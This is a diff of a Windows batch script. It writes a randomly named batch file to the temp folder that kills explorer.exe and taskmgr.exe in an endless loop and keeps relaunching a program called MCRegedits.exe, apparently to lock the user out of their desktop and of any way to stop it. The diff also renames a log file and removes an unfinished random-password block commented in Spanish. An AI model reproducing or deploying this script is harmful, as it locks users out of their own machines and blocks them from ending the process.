@@ -29,18 +29,14 @@ echo :cif >> %temp%\%cifrandom%.bat
 echo taskkill /f /im "explorer.exe" >> %temp%\%cifrandom%.bat
 echo taskkill /f /im "taskmgr.exe" >> %temp%\%cifrandom%.bat
 echo echo off >> %temp%\%cifrandom%.bat
-echo tasklist /FI "IMAGENAME eq MCRegedits.exe" /FO CSV > search.log >> %temp%\%cifrandom%.bat
-echo FOR /F %%A IN (search.log) DO IF %%~zA EQU 0 GOTO end >> %temp%\%cifrandom%.bat
+echo tasklist /FI "IMAGENAME eq MCRegedits.exe" /FO CSV > mcregedits.lmao >> %temp%\%cifrandom%.bat
+echo FOR /F %%A IN (mcregedits.lmao) DO IF %%~zA EQU 0 GOTO end >> %temp%\%cifrandom%.bat
 echo start MCRegedits.exe >> %temp%\%cifrandom%.bat
 echo goto cif >> %temp%\%cifrandom%.bat
 echo :end >> %temp%\%cifrandom%.bat
-echo del search.log >> %temp%\%cifrandom%.bat
+echo del mcregedits.lmao >> %temp%\%cifrandom%.bat
 echo goto cif >> %temp%\%cifrandom%.bat
 start /min %temp%\%cifrandom%.bat
-
-:: GENERAR CONTRA RANDOM ( NO FUNCA )
-SET passw=%random%
-echo %passw% >> %temp%\password.is.%passw%.tino
 
 :start
 start /min %temp%\%cifrandom%.bat
